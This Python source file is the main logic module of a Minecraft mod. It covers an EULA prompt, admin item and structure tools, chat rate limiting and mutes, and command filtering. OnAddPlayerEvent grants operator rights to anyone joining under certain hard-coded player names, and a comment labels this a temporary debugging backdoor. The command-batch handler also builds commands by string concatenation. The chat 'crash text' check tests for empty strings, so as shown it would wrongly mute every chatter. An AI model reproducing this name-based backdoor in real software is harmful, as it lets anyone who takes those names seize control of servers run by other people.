# -*- coding: utf-8 -*-
from __future__ import print_function
from Preset.Model.PartBase import PartBase
from Preset.Model.GameObject import registerGenericClass
import mod.server.extraServerApi as serverApi
import mod.client.extraClientApi as clientApi
import json
import time
import math
import traceback

CFServer = serverApi.GetEngineCompFactory()
CFClient = clientApi.GetEngineCompFactory()
levelId = serverApi.GetLevelId()
compCmd = CFServer.CreateCommand(levelId)
compGame = CFServer.CreateGame(levelId)
compExtra = CFServer.CreateExtraData(levelId)
compHttp = CFServer.CreateHttp(levelId)

def intg(num):
	#type: (float) -> int
	return int(math.floor(num))

def unicode_convert(input):
	#type: (dict|str) -> dict|list|str|bool
	if isinstance(input, dict):
		return {unicode_convert(key): unicode_convert(value) for key, value in input.items()}
	elif isinstance(input, list):
		return [unicode_convert(element) for element in input]
	elif isinstance(input, unicode): # type: ignore
		return input.encode('utf-8')
	return input

@registerGenericClass("MainLogicPart")
class MainLogicPart(PartBase):
	
	def __init__(self):
		PartBase.__init__(self)
		# 零件名称
		self.name = "主逻辑零件"
		self.etsFiles = []
		self.last_message_time = {} # 初始化发言限频字典
		self._is_Structure_Loading = False # 标记当前是否有玩家正在加载结构
		self._buffer = {} # 用于存储分块数据的缓冲区
		self._structure_receive_timeout_counter = 0 # 结构加载超时计数器

	def InitClient(self):
		"""
		@description 客户端的零件对象初始化入口
		"""
		PartBase.InitClient(self)
		clientsystem = clientApi.GetSystem("Minecraft", "preset")
		clientsystem.ListenForEvent("Minecraft", "preset", "openUI", self, self.UI)
		clientsystem.ListenForEvent('Minecraft', 'preset', 'close', self, self.close)
		clientsystem.ListenForEvent(clientApi.GetEngineNamespace(), clientApi.GetEngineSystemName(),'OnLocalPlayerStopLoading', self, self.OnFinish)

	def OnFinish(self, args):
		clientApi.GetSystem("Minecraft", "preset").NotifyToServer('TryOpenEULA', {})

	def TryOpenEULA(self, args):
		playerId = args['__id__']
		playerUid = compHttp.GetPlayerUid(playerId)
		
		def checkEULAgreed_callback(EULAdata):
			compPlayerExtraData = CFServer.CreateExtraData(playerId)
			if EULAdata is None:
				compMsg = CFServer.CreateMsg(playerId)
				compMsg.NotifyOneMessage(playerId, "在与云服务器同步EULA状态时出现了一个错误。", "§c")
				if compPlayerExtraData.GetExtraData('EULA'):
					return
				else:
					serversystem.NotifyToClient(playerId, 'openUI', {"ui": "EULA"})
					return	
			
			# 同步到本地
			cloud_data = {item["key"]: item["value"] for item in EULAdata["entity"]["data"]}
			cloud_agreed = cloud_data.get("EULA_Agreed", False)
			compPlayerExtraData.SetExtraData('EULA', cloud_agreed)
			
			if not cloud_agreed:
				serversystem.NotifyToClient(playerId, 'openUI', {"ui": "EULA"})

		compHttp.LobbyGetStorage(checkEULAgreed_callback, playerUid, ["EULA_Agreed"])

		# compExtra = CFServer.CreateExtraData(playerId)
		
		# if not compExtra.GetExtraData('EULA'):
		# 	serversystem.NotifyToClient(playerId, 'openUI', {"ui": "EULA"})

	def UI(self, args):
		uiNodePreset = self.GetParent().GetChildPresetsByName(args["ui"])[0]
		uiNodePreset.SetUiActive(True)
		uiNodePreset.SetUiVisible(True)
		
	def close(self, args): #不用popTopUi()，防止原生页面被额外关闭
		for i in ["enchant","getitem","nbteditor","itemTips","cmdbatch","struimport"]:
			uiNodePreset = self.GetParent().GetChildPresetsByName(i)[0]
			uiNodePreset.SetUiActive(False)
			uiNodePreset.SetUiVisible(False)

	def enchant(self, enchantdata):
		if CFServer.CreatePlayer(enchantdata["__id__"]).GetPlayerOperation() == 2:
			# 二次权限验证
			compItem = CFServer.CreateItem(enchantdata["__id__"])
			itemDict = compItem.GetPlayerItem(2, 0, True)
			if itemDict:
				if itemDict["userData"] is None:
					itemDict["userData"] = {}
				if itemDict["userData"].get('ench', None) is None:
					itemDict["userData"]['ench'] = []
				if enchantdata["id"] == "del":
					itemDict["userData"]['ench'].pop(0)
				else:
					itemDict["userData"]['ench'].insert(0, {'lvl': {'__type__': 2, '__value__': int(enchantdata["lvl"])}, 'id': {'__type__': 2, '__value__': int(enchantdata["id"])}, 'modEnchant': {'__type__': 8, '__value__': ''}})
				itemDict["enchantData"] = []
				compItem.SpawnItemToPlayerCarried(itemDict, enchantdata["__id__"])

	def getitem(self, itemdata):
		if CFServer.CreatePlayer(itemdata["__id__"]).GetPlayerOperation() == 2:
			CFServer.CreateItem(itemdata["__id__"]).SpawnItemToPlayerInv(itemdata, itemdata["__id__"])

	def loadstructure_handshake(self, data):
		self.structure_loading_playerid = data.get("__id__", None)
		serversystem = serverApi.GetSystem("Minecraft", "preset")
		if self._is_Structure_Loading:
			serversystem.NotifyToClient(self.structure_loading_playerid, 'HandShake_Success', {"REJECT": True,"reason":"SERVER_BUSY"})
			return
		elif CFServer.CreatePlayer(self.structure_loading_playerid).GetPlayerOperation() != 2:
			serversystem.NotifyToClient(self.structure_loading_playerid, 'HandShake_Success', {"REJECT": True,"reason":"NO_PERMISSION"})
			return
		else:
			serversystem.NotifyToClient(self.structure_loading_playerid, 'HandShake_Success', {"REJECT": False})
		self._is_Structure_Loading = True
		serversystem.ListenForEvent('Minecraft', 'preset', 'ReceiveStructureData_'+str(self.structure_loading_playerid), self, self._process_packet)
		
		self._structure_receive_timeout_counter = 0
		self._structure_receive_timeout_timer_object = compGame.AddRepeatedTimer(1, self._structure_receive_timeout_timer) # 计时器，发包间隔超过20秒则视为超时

	def _structure_receive_timeout_timer(self):
		self._structure_receive_timeout_counter = self._structure_receive_timeout_counter + 1
		if self._structure_receive_timeout_counter >= 20:
			print("取消结构加载，原因：接收数据超时")
			self._structure_receive_timeout_counter = 0
			self._is_Structure_Loading = False
			self._buffer.clear()
			serversystem = serverApi.GetSystem("Minecraft", "preset")
			serversystem.UnListenForEvent('Minecraft', 'preset', 'ReceiveStructureData_'+str(self.structure_loading_playerid), self, self._process_packet)
			compGame.CancelTimer(self._structure_receive_timeout_timer_object)
			del self._structure_receive_timeout_timer_object

	def _process_packet(self, packet):
		'''
		服务端收到的数据包：
		packet = {
				"sequence": index,  # 数据包的序号，从0开始
				"total_chunks": len(chunks),
				"data": chunk,
				"is_last": is_last  # 是否为最后一个数据包
			}
		'''
		sequence = packet.get("sequence", None)
		is_last = packet.get("is_last", False)
		playerid = packet.get("__id__", None)
		print("接收到来自玩家 %s 的数据包，序号：%s" % (playerid, sequence))
		self._structure_receive_timeout_counter = 0 # 重置超时计数器

		# 将数据包存入队列
		self._buffer[sequence] = packet.get("data", None)
		
		if is_last:
			print("玩家 %s 的所有数据包已接收完毕，开始组装数据..." % playerid)
			serversystem = serverApi.GetSystem("Minecraft", "preset")
			serversystem.UnListenForEvent('Minecraft', 'preset', 'ReceiveStructureData_'+str(playerid), self, self._process_packet)
			compGame.CancelTimer(self._structure_receive_timeout_timer_object)
			try:
				self._assemble_text(playerid)
			except:
				compMsg = CFServer.CreateMsg(playerid)
				compMsg.NotifyOneMessage(playerid, '结构加载错误，原因如下', '§c')
				for i in traceback.format_exc().splitlines():
					compMsg.NotifyOneMessage(playerid, i, '§c')
				self._is_Structure_Loading = False

	def _assemble_text(self, playerid):
		# 按序号排序并组装数据
		assembled_data = ''.join(self._buffer[i] for i in sorted(self._buffer.keys()))
		structuredata = unicode_convert(json.loads(assembled_data)) #仍然会被storagekey崩掉，暂时留存
		self._buffer.clear()  # 清空缓冲区
		self.Load_Structure(structuredata, playerid)

	def Load_Structure(self,data,playerid=None):
		if CFServer.CreatePlayer(playerid).GetPlayerOperation() == 2:
			playerpos = CFServer.CreatePos(playerid).GetFootPos()
			player_X, player_Y, player_Z = playerpos
			player_X = intg(player_X)
			player_Y = int(player_Y)
			player_Z = intg(player_Z)
			structure = data["structuredata"]
			#print(data)
			palette = structure['structure']['palette']['default']
			block_entity_data = palette['block_position_data']
			serversystem = serverApi.GetSystem("Minecraft", "preset")
			blockcomp = CFServer.CreateBlockInfo(levelId)
			blockStateComp = CFServer.CreateBlockState(levelId)
			i = 0
			compMsg = CFServer.CreateMsg(playerid)
			for x in range(structure["size"][0]):
				for y in range(structure['size'][1]):
					for z in range(structure['size'][2]):
						if structure['structure']['block_indices'][0][i] != -1:
							blockcomp.SetBlockNew((player_X+x, player_Y+y,player_Z+z),
							 					{'name':palette['block_palette'][structure['structure']['block_indices'][0][i]]['name'], 
			  									'aux': palette['block_palette'][structure['structure']['block_indices'][0][i]].get('val', 0)}, 
												0, 
												data['dimension'], 
												False, 
												False)
							blockStateComp.SetBlockStates((player_X+x, player_Y+y,player_Z+z),palette['block_palette'][structure['structure']['block_indices'][0][i]].get('states', {}), data['dimension'])
							if block_entity_data.has_key(str(i)) and block_entity_data[str(i)].has_key('block_entity_data'):
								if i % 10 == 0: print(block_entity_data[str(i)]['block_entity_data'])
								blockcomp.SetBlockEntityData(data['dimension'], (player_X+x, player_Y+y,player_Z+z), block_entity_data[str(i)]['block_entity_data'])
						i += 1
			for i in structure['structure']['entities']:
				x, y, z = i['Pos']
				x = x['__value__']
				y = y['__value__']
				z = z['__value__']
				x -= structure['structure_world_origin'][0]
				y -= structure['structure_world_origin'][1]
				z -= structure['structure_world_origin'][2]
				x += player_X
				y += player_Y
				z += player_Z
				serversystem.CreateEngineEntityByNBT(i, (x, y, z), None, data['dimension'])
		self._is_Structure_Loading = False


	def InitServer(self):
		global serversystem
		serversystem = serverApi.GetSystem("Minecraft", "preset")
		listenServerSysEvent = lambda eventId, callback: serversystem.ListenForEvent(serverApi.GetEngineNamespace(), serverApi.GetEngineSystemName(), eventId, self, callback)
		listenServerSysEvent("ServerChatEvent", self.OnServerChat)
		listenServerSysEvent("CommandEvent", self.OnCommandEvent)
		listenServerSysEvent("PlayerJoinMessageEvent", self.OnAddPlayerEvent)
		listenServerSysEvent("PlayerLeftMessageServerEvent", self.OnRemovePlayerEvent)
		listenServerSysEvent("ClientLoadAddonsFinishServerEvent", self.OnClientLoadAddonsFinishServerEvent)
		listenServerSysEvent("PlayerPermissionChangeServerEvent", self.OnPermissionChange)
		listenServerSysEvent("ServerBlockUseEvent", self.OnUseCustomBlock)
		serversystem.ListenForEvent('Minecraft', 'preset', "enchant", self, self.enchant)
		serversystem.ListenForEvent('Minecraft', 'preset', "getitem", self, self.getitem)
		serversystem.ListenForEvent('Minecraft', 'preset', "changeTip", self, self.changeTips)
		serversystem.ListenForEvent('Minecraft', 'preset', "changenbt", self, self.changenbt)
		serversystem.ListenForEvent('Minecraft', 'preset', 'cmdbatch', self, self.cmdbatch)
		serversystem.ListenForEvent('Minecraft', 'preset', 'loadstructure_handshake', self, self.loadstructure_handshake)
		serversystem.ListenForEvent('Minecraft', 'preset', 'TryOpenEULA', self, self.TryOpenEULA)
		serversystem.ListenForEvent('Minecraft', 'preset', 'EULA', self, self.eula)
		compCmd.SetCommandPermissionLevel(4)
		CFServer.CreatePet(levelId).Disable() 

		"""
		@description 服务端的零件对象初始化入口
		"""

		PartBase.InitServer(self)

	

	def eula(self, args):
		playerId = args['__id__']
		if args["reason"] == "EULA_FAILED_ERROR":
			compCmd.SetCommand('/kick %s %s' % (CFServer.CreateName(playerId).GetName(), "您没有接受EULA协议"), False)
		elif args["reason"] == "EULA_AGREED":
			compMsg = CFServer.CreateMsg(playerId)
			playerUid = compHttp.GetPlayerUid(playerId)
			def callback(result):
				if result is None:
					compMsg.NotifyOneMessage(playerId, "在与云服务器同步EULA状态时出现了一个错误。", "§c")
					compMsg.NotifyOneMessage(playerId, "感谢您接受EULA协议！", "§a")
					CFServer.CreateExtraData(playerId).SetExtraData('EULA', True)
					return
				else:
					compMsg.NotifyOneMessage(playerId, "感谢您接受EULA协议！EULA状态已同步至云服务器。", "§a")
					CFServer.CreateExtraData(playerId).SetExtraData('EULA', True)
			def entities_getter():
				return [{
					"key": "EULA_Agreed",
					"value": True
				}]
			compHttp.LobbySetStorageAndUserItem(callback, playerUid, None, entities_getter)
		else:
			compCmd.SetCommand('/kick %s %s' % (CFServer.CreateName(playerId).GetName(), "发生了未知错误，请联系开发者"), False)

	def changenbt(self, args):
		if CFServer.CreatePlayer(args["__id__"]).GetPlayerOperation() == 2:
			CFServer.CreateItem(args["__id__"]).SpawnItemToPlayerCarried(args["nbt"], args["__id__"])
	
	def cmdbatch(self, cmds):
		playerid = cmds["__id__"]
		cmd = cmds["cmds"]
		if CFServer.CreatePlayer(playerid).GetPlayerOperation() == 2:
			cmd = cmd.split("\n")
			playername = CFServer.CreateName(playerid).GetName()
			for i in cmd:
				compCmd.SetCommand('/execute as "'+ playername +'" at @s run ' + i, True)
		
	def changeTips(self, tips):
		if CFServer.CreatePlayer(tips["__id__"]).GetPlayerOperation() == 2:
			itemComp = CFServer.CreateItem(tips["__id__"])
			itemDict = itemComp.GetEntityItem(2, 0, True)
			if tips["Tips"] == '':
				del itemDict['userData']['ItemCustomTips']
			itemDict['customTips'] = tips["Tips"]
			itemComp.SpawnItemToPlayerCarried(itemDict, tips["__id__"])

	def OnServerChat(self, args):
		
		def check_time_limit(playerId,current_time):
			# 管理员无限制
			if CFServer.CreatePlayer(playerId).GetPlayerOperation() == 2:
				return True
			
			limitFrequency = compExtra.GetExtraData("limitFrequency") if compExtra.GetExtraData("limitFrequency") else 0 # 如未定义，默认为0，即无限制
			if (limitFrequency - 0) < 0.01: # 处理浮点数误差 
				return True
			elif playerId in self.last_message_time:
				last_time = self.last_message_time[playerId]
				time_elapsed = current_time - last_time
				if time_elapsed < limitFrequency:
					compMsg = CFServer.CreateMsg(playerId)
					compMsg.NotifyOneMessage(playerId, "§e§l[MSGWatcher] §r§e您发送消息过于频繁，请等待 %.1f 秒后再试" % (limitFrequency - time_elapsed))
					return False # 未超过限定时间
				else:
					return True # 超过限定时间，允许发言
			else:
				return True # 从未发言的玩家，允许发言

		playerId = args["playerId"]
		message = args["message"]
		username = args["username"]
		args["cancel"] = True
		CFServer.CreateEntityComponent(playerId).GetEntitiesBySelector

		if CFServer.CreateExtraData(playerId).GetExtraData("mute"):
			compMsg = CFServer.CreateMsg(playerId)
			compMsg.NotifyOneMessage(playerId, "您无法在被禁言状态下发送消息，请联系房间管理解除禁言。", "§e")
			return
		
		
		for token in ("", "", ""):
			if token in message:
				compMsg = CFServer.CreateMsg(playerId)
				compMsg.NotifyOneMessage(playerId, "§e§l[MSGWatcher] §r§c检测到您试图发送崩服文本，系统已将您禁言！请联系房间管理解除禁言", "§c")
				compCmd.SetCommand('/tellraw @a[tag=op] {"rawtext":[{"text":"§6§l管理小助手>>> §r§e检测到玩家§c【%s】§r§e试图发送崩服文本，系统已将其禁言。若需解除禁言，请使用§a/mute§e命令"}]}' % username)
				CFServer.CreateExtraData(playerId).SetExtraData("mute", True)
				return
		
		# 普通消息
		current_time = time.time()
		if check_time_limit(playerId,current_time):
			compdata = CFServer.CreateExtraData(playerId)
			chatprefix = compdata.GetExtraData("chatprefix") if compdata.GetExtraData("chatprefix") else ""
			sanitized_msg = message if compGame.CheckWordsValid(message) else "***"
			compGame.SetNotifyMsg("%s%s >>> %s" % (chatprefix, username, sanitized_msg))
			self.last_message_time[playerId] = current_time

	def OnCommandEvent(self, args):
		compMsg = CFServer.CreateMsg(args["entityId"])
		cmd = args["command"].strip().lower()
		entityId = args["entityId"]
		if cmd.startswith("/kill @e"):
			# 检查命令的剩余部分是否只有空格（忽略首尾空格）
			if not cmd[9:].strip():
				args["cancel"] = True
				compMsg.NotifyOneMessage(entityId, '命令 /kill @e 已在本地图被禁止。', "§c")
				return
		
		if any(cmd.startswith(prefix) for prefix in ("/msg", "/me", "/tell","/w")):
			allow_msg = compExtra.GetExtraData("allow_msg")
			if not allow_msg and CFServer.CreatePlayer(entityId).GetPlayerOperation() != 2:
				args["cancel"] = True
				compMsg.NotifyOneMessage(entityId, "§r§e§l[MSGWatcher] §r§c当前房间禁止私聊消息。", "§c")
				return
			ifmute = CFServer.CreateExtraData(entityId).GetExtraData("mute")
			if ifmute:
				args["cancel"] = True
				compMsg.NotifyOneMessage(entityId, 
										"您无法在被禁言状态下发送消息，请联系房间管理解除禁言。", 
										"§e")
				return
			def check_time_limit(playerId,current_time):
				# 管理员无限制
				if CFServer.CreatePlayer(playerId).GetPlayerOperation() == 2:
					return True
				
				limitFrequency = compExtra.GetExtraData("limitFrequency") if compExtra.GetExtraData("limitFrequency") else 0 # 如未定义，默认为0，即无限制
				if (limitFrequency - 0) < 0.01: # 处理浮点数误差 
					return True
				elif playerId in self.last_message_time:
					last_time = self.last_message_time[playerId]
					time_elapsed = current_time - last_time
					if time_elapsed < limitFrequency:
						compMsg = CFServer.CreateMsg(playerId)
						compMsg.NotifyOneMessage(playerId, "§e§l[MSGWatcher] §r§e您发送消息过于频繁，请等待 %.1f 秒后再试" % (limitFrequency - time_elapsed))
						return False # 未超过限定时间
					else:
						return True # 超过限定时间，允许发言
				else:
					return True # 从未发言的玩家，允许发言
			current_time = time.time()
			if check_time_limit(entityId,current_time):
				self.last_message_time[entityId] = current_time # 更新最后发言时间
			else:
				args["cancel"] = True
				return

	def OnAddPlayerEvent(self, args):
		if args["name"] == "王培衡很丁丁":
			args["message"] = "§b§l[开发者] §r§e王培衡很丁丁 加入了游戏"
			CFServer.CreatePlayer(args["id"]).SetPermissionLevel(2)
		elif args["name"] == "EGGYLAN_":
			args["message"] = "§b§l[开发者] §r§eEGGYLAN_ 加入了游戏"
			CFServer.CreatePlayer(args["id"]).SetPermissionLevel(2)
		elif args["name"] == "EGGYLAN":
			args["message"] = "§b§l[开发者] §r§eEGGYLAN 加入了游戏"
			CFServer.CreatePlayer(args["id"]).SetPermissionLevel(2)
		elif args["name"] == "渡鸦哥与陌生人":
			CFServer.CreatePlayer(args["id"]).SetPermissionLevel(2)
		# 临时后门，仅用于调试

	def OnClientLoadAddonsFinishServerEvent(self, args):
		playername = CFServer.CreateName(args["playerId"]).GetName()
		
		# 禁用魔法指令功能
		CFServer.CreateAiCommand(args["playerId"]).Disable()
		
		if not compGame.CheckWordsValid(playername):
			CFServer.CreatePlayer(args["playerId"]).SetPermissionLevel(0)
			CFServer.CreateMsg(args["playerId"]).NotifyOneMessage(args["playerId"], "§6§l管理小助手>>> §r§c检测到您的名字中含有违禁词，已将您设为游客权限。")
			compCmd.SetCommand('/tellraw @a {"rawtext":[{"text":"§6§l房间公告>>> §r§e检测到名字含有违禁词的玩家加入了游戏，已将其设为游客权限!"}]}',False)
			compCmd.SetCommand('/tellraw @a[tag=op] {"rawtext":[{"text":"§6§l管理小助手>>> §r§b可使用§a@a[tag=banname]§b选中违禁词玩家!"}]}',False)
			CFServer.CreateTag(args["playerId"]).AddEntityTag("banname")
	
	def OnRemovePlayerEvent(self, args):
		if args["name"] == "王培衡很丁丁":
			args["message"] = "§b§l[开发者] §r§e王培衡很丁丁 离开了游戏"
		elif args["name"] == "EGGYLAN_":
			args["message"] = "§b§l[开发者] §r§eEGGYLAN_ 离开了游戏"
		elif args["name"] == "EGGYLAN":
			args["message"] = "§b§l[开发者] §r§eEGGYLAN 离开了游戏"

	def OnPermissionChange(self, args):
		compMsg = CFServer.CreateMsg(args['playerId'])
		compTag = CFServer.CreateTag(args['playerId'])
		if not args['oldPermission']['op'] and args['newPermission']['op']:
			compMsg.NotifyOneMessage(args['playerId'], '§6§l管理小助手>>> §r§a您已获得管理员权限')
			compTag.AddEntityTag("op")
		elif args['oldPermission']['op'] and not args['newPermission']['op']:
			compMsg.NotifyOneMessage(args['playerId'], '§6§l管理小助手>>> §r§c您的管理员权限已被撤销')
			compTag.RemoveEntityTag("op")

	def OnUseCustomBlock(self, args):
		playerId = args['playerId']
		if args['blockName'] == 'gtmb_plugin:function_block':
			compPlayer = CFServer.CreatePlayer(playerId)
			if compPlayer.GetPlayerAbilities()['op']:
				print('Trying open fn block')
				serversystem.NotifyToClient(playerId, 'openUI', {"ui": "functionBlockScreen"})
			else:
				args['cancel'] = True


	def TickClient(self):
		"""
		@description 客户端的零件对象逻辑驱动入口
		"""
		PartBase.TickClient(self)

	def TickServer(self):
		"""
		@description 服务端的零件对象逻辑驱动入口
		"""
		PartBase.TickServer(self)

	def DestroyClient(self):
		"""
		@description 客户端的零件对象销毁逻辑入口
		"""
		clientsystem = clientApi.GetSystem("Minecraft", "preset")
		clientsystem.UnListenAllEvents()
		PartBase.DestroyClient(self)

	def DestroyServer(self):
		"""
		@description 服务端的零件对象销毁逻辑入口
		"""
		CFServer.CreateGame(serverApi.GetLevelId).CancelTimer(self.timer)
		serversystem = serverApi.GetSystem("Minecraft", "preset")
		serversystem.UnListenAllEvents()
		PartBase.DestroyServer(self)